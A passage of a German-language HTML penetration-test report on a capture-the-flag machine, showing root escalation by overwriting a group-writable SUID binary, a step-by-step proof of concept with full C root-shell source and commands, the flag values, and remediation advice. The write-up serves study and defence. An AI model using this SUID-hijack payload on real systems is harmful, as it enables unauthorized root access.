+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `theuser` wird eine C-Datei (`suidyyyyy.c`) erstellt, die `setuid(0)`, `setgid(0)` aufruft und `/bin/bash` startet. Diese wird zu `suidyyyyy` kompiliert. Anschließend wird die ursprüngliche Datei `/home/suidy/suidyyyyy` mit dieser kompilierten Version überschrieben. Da `theuser` Mitglied der Gruppe `theuser` ist und die Datei Gruppenschreibrechte hat (`rwsrwsr-x`), ist das Überschreiben möglich. Nach einer (impliziten) kurzen Wartezeit, in der der Root-Prozess das SUID-Bit wiederherstellt (gemäß dem Hinweis in `note.txt`), wird `/home/suidy/suidyyyyy` erneut ausgeführt. Diesmal startet das manipulierte Binary eine Bash-Shell, die dank des (wiederhergestellten) SUID-Bits und der `setuid(0)`/`setgid(0)`-Aufrufe als `root` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu `root` erfolgreich abgeschlossen! Der Mechanismus beruht auf einer Kombination aus unsicheren Dateiberechtigungen (SGID und Gruppenschreibrecht für `theuser` auf einem SUID-Root-Binary) und einem Hintergrundprozess, der das SUID-Bit nach dem Überschreiben wiederherstellt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff erreicht. Suchen Sie die Root-Flag.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsicheren Berechtigungen und das SUID/SGID-Bit von `/home/suidy/suidyyyyy`. Finden und deaktivieren Sie den Cronjob/Skript, der das SUID-Bit wiederherstellt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@suidy:/home/theuser# <span class="command">cd /root</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@suidy:/root# <span class="command">ls</span></div>
+                    <pre>root.txt  timer.sh</pre>
+                    <div class="prompt">root@suidy:/root# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">HMV0000EVE</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer wird in das `/root`-Verzeichnis gewechselt. Dort befindet sich die `root.txt` und ein Skript namens `timer.sh` (vermutlich das Skript, das das SUID-Bit wiederherstellt). Die `root.txt` wird gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Flags gefunden. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag. Untersuchen Sie `timer.sh` und deaktivieren Sie es.</p>
+
+        </section>
+
+         <section id="poc">
+             <h2>Proof of Concept (SUID Binary Hijacking via Group Write Permissions)</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Das System enthält ein benutzerdefiniertes Binary `/home/suidy/suidyyyyy`, das SUID Root und SGID `theuser` gesetzt hat. Entscheidend ist, dass die Datei auch Gruppenschreibrechte besitzt (`rwsrwsr-x`). Der Benutzer `theuser`, der Mitglied der Gruppe `theuser` ist, kann diese Datei daher überschreiben. Ein Hintergrundprozess (vermutlich ein Cronjob, der `/root/timer.sh` ausführt) setzt regelmäßig das SUID-Bit für diese Datei neu, falls es entfernt wurde. Ein Angreifer mit Zugriff als `theuser` kann dies ausnutzen, indem er eine eigene C-Datei erstellt, die `setuid(0)` und `setgid(0)` aufruft und eine Shell (`/bin/bash`) startet. Diese Datei wird kompiliert und dann verwendet, um `/home/suidy/suidyyyyy` zu überschreiben. Nachdem der Hintergrundprozess das SUID-Bit auf der manipulierten Datei wiederhergestellt hat, führt die nächste Ausführung von `/home/suidy/suidyyyyy` durch den Angreifer zur Erlangung einer Root-Shell.</p>
+
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 <ul>
+                    <li>Shell-Zugriff als Benutzer, der Mitglied der Gruppe ist, der das SUID/SGID-Binary gehört und für die Schreibrechte gesetzt sind (hier `theuser`).</li>
+                     <li>Das SUID/SGID-Binary (`/home/suidy/suidyyyyy`) muss für den Angreifer ausführbar sein.</li>
+                    <li>Ein Mechanismus (z.B. Cronjob), der das SUID-Bit auf dem Binary wiederherstellt, falls es durch das Überschreiben verloren geht (oder das Überschreiben erhält das SUID-Bit, was weniger wahrscheinlich ist).</li>
+                    <li>Ein C-Compiler (`gcc`) muss auf dem System verfügbar sein.</li>
+                 </ul>
+             </p>
+
+             <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                 <ol>
+                     <li>
+                         <strong>Payload erstellen (als `theuser`):</strong>
+                         Erstellen Sie eine Datei `exploit.c` mit folgendem Inhalt:
+                         <div class="code-block">
+                             <pre>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(){
+  setuid(0);
+  setgid(0);
+  system("/bin/bash -p"); // -p behält die effektiven Rechte bei
+  return 0;
+}
+</pre>
+                         </div>
+                     </li>
+                     <li>
+                         <strong>Payload kompilieren (als `theuser`):</strong>
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">theuser@suidy:~$ <span class="command">gcc exploit.c -o exploit</span></div>
+                             </div>
+                         </div>
+                     </li>
+                     <li>
+                         <strong>Original-Binary überschreiben (als `theuser`):</strong>
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">theuser@suidy:~$ <span class="command">cp exploit /home/suidy/suidyyyyy</span></div>
+                            </div>
+                         </div>
+                     </li>
+                     <li>
+                         <strong>Warten:** Warten Sie kurz, damit der Hintergrundprozess das SUID-Bit auf `/home/suidy/suidyyyyy` wiederherstellen kann (Zeit kann variieren).
+                     </li>
+                     <li>
+                         <strong>Manipuliertes Binary ausführen (als `theuser`):**
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">theuser@suidy:~$ <span class="command">/home/suidy/suidyyyyy</span></div>
+                                 <pre>root@suidy:/home/theuser# <span class="password"># Root-Shell!</span></pre>
+                            </div>
+                         </div>
+                     </li>
+                 </ol>
+             </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Eine interaktive Shell mit Root-Privilegien.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Der Shell-Prompt wechselt zu `root@suidy...` und Befehle wie `id` zeigen `uid=0(root)`. </p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Sehr Hoch. Unsichere Berechtigungen auf SUID/SGID-Dateien in Kombination mit einem Mechanismus, der diese Berechtigungen aufrechterhält, stellen einen direkten Weg zur Root-Eskalation dar.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                     <li>**Korrigieren Sie Dateiberechtigungen:** Entfernen Sie die Schreibrechte für die Gruppe `theuser` von der Datei `/home/suidy/suidyyyyy`. Idealerweise sollten SUID/SGID-Binaries nur für `root` schreibbar sein (`rwsr-xr-x` oder restriktiver).</li>
+                     <li>**Entfernen Sie SUID/SGID:** Wenn die SUID/SGID-Funktionalität nicht zwingend erforderlich ist, entfernen Sie die Bits (`chmod u-s,g-s /home/suidy/suidyyyyy`).</li>
+                     <li>**Deaktivieren Sie den Wiederherstellungsmechanismus:** Finden Sie den Cronjob oder das Skript (wahrscheinlich `/root/timer.sh`), das das SUID-Bit setzt, und deaktivieren oder korrigieren Sie es. Das automatische Wiederherstellen von SUID-Bits ist eine gefährliche Praxis.</li>
+                     <li>**Prinzip der geringsten Rechte:** Weisen Sie Berechtigungen und SUID/SGID-Bits nur dann zu, wenn es absolut notwendig ist.</li>
+                 </ul>
+             </p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/theuser/user.txt</div>
+                    <div class="flag-value"><span class="password">HMV2353IVI</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMV0000EVE</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 8. Oktober 2022</p> <!-- Korrektes Datum aus Nmap/SNMP extrahiert -->
+    </footer>
+</body>
+</html>
